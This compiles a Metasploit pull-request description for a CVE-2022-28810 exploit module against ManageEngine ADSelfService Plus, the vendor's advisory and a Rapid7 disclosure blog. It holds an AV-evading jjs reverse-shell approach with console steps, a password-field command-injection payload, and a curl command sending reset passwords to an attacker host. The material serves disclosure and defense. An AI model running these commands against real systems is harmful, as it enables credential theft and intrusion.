### @jbaines-r7 **[jbaines-r7](/jbaines-r7)** commented [Apr 19, 2022](#issue-1208736140)

This is an implementation of an attack [Rapid7](https://www.rapid7.com/blog/post/2022/04/14/cve-2022-28810-manageengine-adselfservice-plus-authenticated-command-execution-fixed/) observed in the wild against ManageEngine ADSelfService Plus (ADSSP). Attackers were using the ADSSP's "custom script" functionality to execute arbitrary operating system commands whenever domain users reset their passwords. The "custom script" logic can only be accessed by the `admin` user, but `admin` has a default password (`admin`) that isn't getting changed as often as you'd hope.

The "custom script" functionality that this module abuses was removed in build 6122 to address [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810"). The vendor worded [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810") in such a way that it's unclear if they think the specific behavior this module abuses falls under the umbrella of [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810"). But, since my name is associated with the CVE, I'm going to claim some type of authoritative knowledge and say, "Yes, fixing [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810") is in part about preventing arbitrary command execution using custom scripts."

Anyway. There are a few of "interesting" things about this module because isn't there always?

## jjs is good

In the wild, the attacker was executing powershell to download stuff and whatever. Which is fine. But I thought this was a good opportunity to use `jjs` since ADSSP installs Java in tree and we always know where it is relative to our working directory. This was extra interesting because we didn't have a `jjs` reverse shell for Windows, and it is actually a good use for this vulnerability.

So this pull request also adds a reverse shell for Windows using jjs. It's almost entirely a copy and paste of [@bcoles](https://github.com/bcoles) work... to the point I didn't take any credit (there were a few minor tweaks but nothing to get all excited about). I enjoy `jjs` because the payload will execute "in memory" ish and Defender still seems not to give a hoot about it so you never have to mess around with builtin Windows AV. I actually published my own [jjs c2](https://github.com/jacob-baines/longtime-sunshine) a number of months before the cited links in the `jjs_reverse_tcp.rb` but I'm sure others did too. Either way, jjs is good. I'm very happy to use jjs here.

There's always the argument that the module should drop meterpeter but this is likely to be the more successful solution

## DisablePayloadHandler

This module sets `DisablePayloadHandler` to true and then starts it's own payload handler (code which was stolen almost wholesale from `windows/local/persistence.rb`). This is a side affect from the module requiring user interaction to execute the payload. The module is set to `passive` so it can wait in the background, but it will simply exit after a brief timeout if using the default payload handler. Hence controlling it's own handler is the solution.

## TARGET\_RESET

Exploitation leaves our payload in the custom script form, so I added an option that will simply clean up the target if the user specifies `true`. Again, due to the user interaction nature of this attack, there isn't a great time to clean everything up (it's not as simple as deleting a file), so I figured this was a reasonable solution. 🤷

## Default port

By default this thing installs as HTTP on 8888. It can be configured to use HTTPs (9251 by default). I left the default port as 8888 with SSL set to false, but I think it's more likely that exploitable cases will be using HTTPs. Thoughts? Should I switch it over?

I've attached both video and pcap demonstrating exploitation. The video is worth a watch to understand what is happening, probably. The pcap should be useful for all of our signature writing friends (it's HTTP by default 😱). That's it.

## Verification

List the steps needed to make sure this thing works

* Follow the setup steps in the documentation
* Start `msfconsole`
* use exploit/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810`
* `set RHOST <ip>`
* `set LHOST <ip>`
* `check`
* Verify the remote host is vulnerable.
* `run`
* Verify the module is waiting for a reverse TCP connection
* Navigate to the ADSelfService Plus web UI and reset your test users password.
* After a new password has been set, verify the module received a reverse shell.
* Exit the shell
* Do `set TARGET_RESET true`
* Do `run`
* Navigate to the ADSelfService Plus web UI, log in as admin, and verify that the custom

  scripts have been removed and disabled ("Configuration" -> "Self Service" ->

  "Policy Configuration" -> "Advanced" -> "Password Sync")

That makes this a bit less sketchy 😄  Retested:  ``` msf6 > use exploit/windows/http/manageengine_adselfservice_plus_cve_2022_28810 [*] Using configured payload cmd/windows/jjs_reverse_tcp msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set RHOST 10.0.0.20 RHOST => 10.0.0.20 msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set LHOST 10.0.0.2 LHOST => 10.0.0.2 msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > check [*] 10.0.0.20:8888 - The target appears to be vulnerable.

# CVE-2022-28810 - ManageEngine ADSelfService Plus

| Vulnerability details | |
| --- | --- |
| **Severity** | **High** |
| **CVE ID** | CVE-2022-28810 |
| **Affected software versions** | Builds 6121 and below |
| **Fixed version** | Build 6122 |
| **Fixed on** | April 9, 2022 |

## Details

CVE-2022-28810 refers to a security vulnerability reported in ManageEngine ADSelfService Plus that could lead to remote command execution when administrators enabled custom scripts for password sync with required providers, and set the passwords to be sent as arguments during the sync process. When performing a password change or reset, an authenticated end-user could exploit this vulnerability by entering a CMD command in the password field, and have it run remotely on the machine the ADSelfService Plus server is installed in.

We have now released ADSelfService Plus build 6122 with the following updates to fix this issue:

* Only VBScript and PowerShell files are allowed for custom script.
* All the script will now be stored strictly in the <Installation Directory> /Scripts folder.
* Newly set passwords are encoded and sent to the script as parameters.
* Passwords are sent as string literals instead of arguments to avoid unauthorized execution of commands.

## Impact

An authenticated end-user can execute remote codes on the machine where ADSelfService Plus is installed.

## Steps to upgrade

Update your ADSelfService Plus instance to 6122 using the [service pack](https://www.manageengine.com/products/self-service-password/service-pack.html).

## Post-upgrade

After upgrading to build 6122, follow [these guidelines](https://www.manageengine.com/products/self-service-password/kb/custom-script-security-considerations.html), for better security when using custom scripts.

## Acknowledgements

This issue was reported by Hernan Diaz, Andrew Iwamaye, Dan Kelly, and Jake Baines of Rapid7 via our Zoho Bug Bounty program.

# CVE-2022-28810: ManageEngine ADSelfService Plus Authenticated Command Execution (Fixed)

* Apr 14, 2022
* 4 min read
* [Jake Baines](/blog/author/jake-baines/)

*Last updated at Thu, 25 Jul 2024 19:20:22 GMT*

On April 9, 2022, ManageEngine fixed [CVE-2022-28810](https://www.manageengine.com/products/self-service-password/kb/cve-2022-28810.html) with the release of ADSelfService Plus Build 6122. The vulnerability allowed the `admin` user to execute arbitrary operating system commands and potentially allowed partially authenticated Active Directory users to execute arbitrary operating system commands via the password reset functionality. Rapid7’s Managed Detection and Response (MDR) team has observed this custom scripts feature in ADSelfService Plus being abused in the wild by remote attackers with valid administrative credentials.

## Credit

This vulnerability was discovered by Rapid7 researchers Jake Baines, Hernan Diaz, Andrew Iwamaye, and Dan Kelly.

## Exploitation

The vulnerability arose from a feature that allowed the `admin` user to execute arbitrary operating system commands after a password reset or account lockout status update.

![](https://blog.rapid7.com/content/images/2022/04/image1-3.png)

The example provided by the UI is `cscript test.vbs %userName %password%` where `test.vbs` is supposed to be a file stored in `C:\ManageEngine\ADSelfService Plus\bin` by a user with local access to the underlying operating system. But the reality is that any commands could be stored here. An attacker that acquired the `admin` user’s password (default: admin) could trivially achieve remote command execution this way.

For example, the attacker could use the script command “cmd.exe /c whoami,” and when a user resets their password, the command “whoami” is executed.

![](https://blog.rapid7.com/content/images/2022/04/image4-2.png)

Rapid7 MDR has observed this technique being actively leveraged in customer environments — compromised (or default) `admin` credentials have been used to execute arbitrary OS commands in order to gain persistence on the underlying system and attempt to pivot further into the environment.

Furthermore, the “%password%” variable was passed to the configured script without sanitization. Depending on the configured script, an attacker that is able to trigger a password reset could inject arbitrary operating system commands. For example, if the admin user configured the following script:

```
cmd.exe /c echo %username% %password% >> C:\ProgramData\something.txt

```

An attacker could inject arbitrary commands via password reset by providing a %password% like:

```
&& mkdir C:\ProgramData\helloworld && echo hi

```

Resulting in the directory “helloworld” being created in `C:\ProgramData\`.

![](https://blog.rapid7.com/content/images/2022/04/image2-2.png)

Finally, because %password% isn’t sanitized or obfuscated at all, the `admin` user can observe all password changes, allowing them to effectively recover valid credentials for active directory accounts. As a proof of concept for this, we used the `admin` account to configure the password reset script to exfiltrate the new password to a server in the attacker’s control:

```
cmd.exe /c curl http://10.0.0.2:1270/%userName%=%password%

```

The attacker server would receive the following on password reset:

```
albinolobster@ubuntu:~$ nc -lvnp 1270
Listening on 0.0.0.0 1270
Connection received on 10.0.0.13 62065
GET /albinolobster=sl0wrunner! HTTP/1.1
Host: 10.0.0.2:1270
User-Agent: curl/7.55.1
Accept: */*

```
## The patch

ManageEngine fixed this issue by no longer accepting scripts through the web interface. Post action scripts must now be placed on disk by a user with access to the underlying operating system. Furthermore, the script arguments are now base64 encoded. Here is an updated version of the Post Action interface.

![](https://blog.rapid7.com/content/images/2022/04/image3-1.png)
## Indicators of compromise

We encourage users of ManageEngine ADSelfService Plus to inspect the value they have configured in the Post Action fields. Using the `admin` account, you can navigate to the fields by following this pattern: `Configuration -> Self Service -> Policy Configuration -> Advanced -> Password Sync`.

We also highly encourage users to upgrade as soon as possible and to change the `admin` password.
